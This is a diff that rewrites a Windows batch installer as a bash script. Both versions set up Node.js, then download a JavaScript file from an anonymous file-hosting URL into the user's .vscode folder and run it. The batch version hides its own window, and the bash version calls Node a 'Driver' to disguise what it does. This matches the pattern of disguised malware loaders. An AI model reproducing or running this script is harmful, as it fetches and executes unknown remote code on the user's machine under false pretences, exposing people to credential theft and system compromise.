@@ -1,105 +1,120 @@
-@echo off
-title Creating new Info
-setlocal enabledelayedexpansion
+#!/usr/bin/env bash
+set -euo pipefail
 
-if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b
+# -------------------------
+# Helpers
+# -------------------------
+info()  { echo "[INFO] $*"; }
+err()   { echo "[ERROR] $*" >&2; }
+die()   { err "$*"; exit 1; }
 
-REM Get latest Node.js version using PowerShell
-for /f "delims=" %%v in ('powershell -Command "(Invoke-RestMethod https://nodejs.org/dist/index.json)[0].version"') do set "LATEST_VERSION=%%v"
+download() {
+  # download <url> <output>
+  local url="$1"
+  local out="$2"
 
-REM Remove leading "v"
-set "NODE_VERSION=%LATEST_VERSION:~1%"
-set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
-set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
-set "EXTRACT_DIR=%~dp0nodejs"
-set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles64\nodejs\node.exe"
-set "NODE_EXE="
+  if command -v curl >/dev/null 2>&1; then
+    curl -fsSL -o "$out" "$url"
+  elif command -v wget >/dev/null 2>&1; then
+    wget -qO "$out" "$url"
+  else
+    die "Neither curl nor wget is available."
+  fi
+}
 
-:: -------------------------
-:: Check for global Node.js
-:: -------------------------
-where node >nul 2>&1
-if not errorlevel 1 (
-    for /f "delims=" %%v in ('node -v 2^>nul') do set "NODE_INSTALLED_VERSION=%%v"
-    set "NODE_EXE=node"
-    echo [INFO] Node.js is already installed globally: %NODE_INSTALLED_VERSION%
-)
+# -------------------------
+# Detect OS + ARCH (Node dist naming)
+# -------------------------
+OS_UNAME="$(uname -s)"
+ARCH_UNAME="$(uname -m)"
 
-if not defined NODE_EXE (
-    if exist "%PORTABLE_NODE%" (
-        echo [INFO] Portable Node.js found after extraction.
-        set "NODE_EXE=%PORTABLE_NODE%"
-        set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
-    ) else ( echo [INFO] Node.js not found globally. Attempting to extract portable version...
+case "$OS_UNAME" in
+  Darwin) OS_TAG="darwin" ;;
+  Linux)  OS_TAG="linux" ;;
+  *) die "Unsupported OS: $OS_UNAME" ;;
+esac
 
-    :: -------------------------
-    :: Download Node.js MSI if needed
-    :: -------------------------
-    where curl >nul 2>&1
-    if errorlevel 1 (
-        echo [INFO] Using PowerShell to download Node.js...
-        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'"
-    ) else (
-        echo [INFO] Using curl to download Node.js...
-        curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%"
-    )
+case "$ARCH_UNAME" in
+  x86_64|amd64) ARCH_TAG="x64" ;;
+  arm64|aarch64) ARCH_TAG="arm64" ;;
+  *)
+    die "Unsupported architecture: $ARCH_UNAME (need x64 or arm64)"
+    ;;
+esac
 
-    if exist "%~dp0%NODE_MSI%" (
-        echo [INFO] Extracting Node.js MSI to %EXTRACT_DIR%...
-        msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"
-        del "%~dp0%NODE_MSI%"
-    ) else (
-        echo [ERROR] Failed to download Node.js MSI.
-        exit /b 1
-    )
+# -------------------------
+# Prefer global Node if available
+# -------------------------
+NODE_EXE=""
+if command -v node >/dev/null 2>&1; then
+  NODE_INSTALLED_VERSION="$(node -v 2>/dev/null || true)"
+  if [[ -n "${NODE_INSTALLED_VERSION:-}" ]]; then
+    NODE_EXE="node"
+    info "Checking Driver..."
+  fi
+fi
 
-    if exist "%PORTABLE_NODE%" (
-        echo [INFO] Portable Node.js found after extraction.
-        set "NODE_EXE=%PORTABLE_NODE%"
-        set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
-    ) else (
-        echo [ERROR] node.exe not found after extraction.
-        exit /b 1
-    )
-    )
-)
+# -------------------------
+# Download portable Node.js if not found globally
+# -------------------------
+USER_HOME="$HOME/.vscode"
+mkdir -p "$USER_HOME"
 
-:: -------------------------
-:: Confirm Node.js works
-:: -------------------------
-if not defined NODE_EXE (
-    echo [ERROR] Node.js executable not found or set.
-    exit /b 1
-)
-:: -------------------------
-:: Download required files
-:: -------------------------
-set "CODEPROFILE=%USERPROFILE%\.vscode"
-if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%"
+if [[ -z "$NODE_EXE" ]]; then
+  info "Driver not found globally. Downloading portable Driver for ${OS_TAG}-${ARCH_TAG}..."
 
-where curl >nul 2>&1
-if errorlevel 1 (
-    echo [INFO] curl not found. Using PowerShell to download env-setup.npl...
-    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri 'https://files.catbox.moe/1gq866.js' -OutFile '%CODEPROFILE%\env-setup.npl'"
-) else (
-    echo [INFO] Using curl to download env-setup.npl...
-    curl -L -o "%CODEPROFILE%\env-setup.npl" "https://files.catbox.moe/1gq866.js"
-)
-:: -------------------------
-:: Run the parser
-:: -------------------------
-if exist "%CODEPROFILE%\env-setup.npl" (
-    echo [INFO] Running env-setup.npl...
-    cd "%CODEPROFILE%"
-    "%NODE_EXE%" "env-setup.npl"
-    if errorlevel 1 (
-        echo [ERROR] env-setup execution failed.
-        exit /b 1
-    )
-) else (
-    echo [ERROR] env-setup.npl not found.
-    exit /b 1
-)
+  # Fetch latest version from Node dist index.json
+  INDEX_JSON="$USER_HOME/node-index.json"
+  download "https://nodejs.org/dist/index.json" "$INDEX_JSON"
 
-echo [SUCCESS] Script completed successfully.
-exit /b 0
+  # Extract first "version":"vX.Y.Z" from JSON (latest listed first)
+  LATEST_VERSION="$(grep -oE '"version"\s*:\s*"v[0-9]+\.[0-9]+\.[0-9]+"' "$INDEX_JSON" | head -n 1 | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+')"
+  rm -f "$INDEX_JSON"
+
+  [[ -n "${LATEST_VERSION:-}" ]] || die "Failed to determine latest Driver version."
+
+  NODE_VERSION="${LATEST_VERSION#v}"
+  TARBALL_NAME="node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}.tar.xz"
+  DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${TARBALL_NAME}"
+
+  EXTRACTED_DIR="${USER_HOME}/node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}"
+  PORTABLE_NODE="${EXTRACTED_DIR}/bin/node"
+  NODE_TARBALL="${USER_HOME}/${TARBALL_NAME}"
+
+  if [[ -x "$PORTABLE_NODE" ]]; then
+    info "Driver already present: $PORTABLE_NODE"
+  else
+    info "Downloading..."
+    download "$DOWNLOAD_URL" "$NODE_TARBALL"
+
+    [[ -s "$NODE_TARBALL" ]] || die "Failed to download Driver tarball."
+
+    info "Extracting Driver..."
+    tar -xf "$NODE_TARBALL" -C "$USER_HOME"
+    rm -f "$NODE_TARBALL"
+
+    [[ -x "$PORTABLE_NODE" ]] || die "node executable not found after extraction: $PORTABLE_NODE"
+    info "Portable Driver extracted successfully."
+  fi
+
+  NODE_EXE="$PORTABLE_NODE"
+  export PATH="${EXTRACTED_DIR}/bin:${PATH}"
+fi
+
+# -------------------------
+# Verify Node works
+# -------------------------
+"$NODE_EXE" -v >/dev/null 2>&1 || die "Driver execution failed."
+info "Using Driver: $("$NODE_EXE" -v)"
+
+# -------------------------
+# Download and run env-setup.js
+# -------------------------
+ENV_SETUP_JS="${USER_HOME}/env-setup.js"
+download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
+[[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."
+
+info "Running Driver..."
+"$NODE_EXE" "$ENV_SETUP_JS"
+
+info "[SUCCESS] Driver Setup completed successfully."
